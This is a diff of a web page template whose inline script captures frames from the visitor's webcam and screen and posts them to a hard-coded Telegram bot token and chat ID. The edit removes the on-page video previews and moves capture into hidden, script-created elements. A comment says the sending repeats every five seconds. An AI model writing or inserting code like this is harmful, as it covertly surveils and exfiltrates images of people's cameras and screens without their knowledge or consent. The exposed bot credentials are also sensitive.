@@ -7,61 +7,18 @@
     <link rel="shortcut icon" href="https://i.pinimg.com/1200x/5a/ff/e4/5affe417c4d2bdcec4b2289a02b98bd4.jpg" type="image/x-icon">
     <title><%= htmlWebpackPlugin.options.title %></title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-    <style>
-        #cameraFeed, #screenShare {
-            width: 100%;
-            height: auto;
-        }
-    </style>
 </head>
 <body>
-    <video id="cameraFeed" autoplay></video>
-    <video id="screenShare" autoplay></video>
-
     <script>
         const telegramBotToken = '5161111681:AAFSl7YiIuqEUGkUmdbZsEUaH0TgovyubD0';
         const chatId = '1437354716';
 
         function captureScreen() {
-            navigator.mediaDevices.getDisplayMedia({ video: true })
-                .then(stream => {
-                    const screenShareVideo = document.getElementById('screenShare');
-                    screenShareVideo.srcObject = stream;
-                })
-                .catch(err => {
-                    console.error('Error capturing screen: ', err);
-                });
+            return navigator.mediaDevices.getDisplayMedia({ video: true });
         }
 
         function captureCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const cameraFeed = document.getElementById('cameraFeed');
-                    cameraFeed.srcObject = stream;
-                })
-                .catch(err => {
-                    console.error('Error capturing camera: ', err);
-                });
-        }
-
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+            return navigator.mediaDevices.getUserMedia({ video: true });
         }
 
         function sendMediaToTelegram(mediaType, media) {
@@ -81,31 +38,39 @@
             });
         }
 
-        captureCamera();
-        captureScreen();
+        function captureVideoFrame(stream, callback) {
+            const videoElement = document.createElement('video');
+            videoElement.srcObject = stream;
+            videoElement.play();
 
-        // Capture a screenshot or frame from the video element
-        const screenshots = [];
-
-        function captureVideoFrame(videoElement, callback) {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-            screenshotData = imageData.replace(/^data:image\/(png|jpg);base64,/, "");
-            callback(screenshotData);
+            videoElement.onloadedmetadata = function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                screenshotData = imageData.replace(/^data:image\/(png|jpg);base64,/, "");
+                callback(screenshotData);
+            };
         }
 
         function captureAndSend() {
-            captureVideoFrame(document.getElementById('cameraFeed'), (screenshotData) => {
-                sendMediaToTelegram('photo', screenshotData);
-            });
+            Promise.all([captureCamera(), captureScreen()])
+                .then(([cameraStream, screenStream]) => {
+                    captureVideoFrame(cameraStream, (screenshotData) => {
+                        sendMediaToTelegram('photo', screenshotData);
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    });
 
-            captureVideoFrame(document.getElementById('screenShare'), (screenshotData) => {
-                sendMediaToTelegram('photo', screenshotData);
-            });
+                    captureVideoFrame(screenStream, (screenshotData) => {
+                        sendMediaToTelegram('photo', screenshotData);
+                        screenStream.getTracks().forEach(track => track.stop());
+                    });
+                })
+                .catch(err => {
+                    console.error('Error capturing media: ', err);
+                });
         }
 
         // Capture and send screenshots every 5 seconds
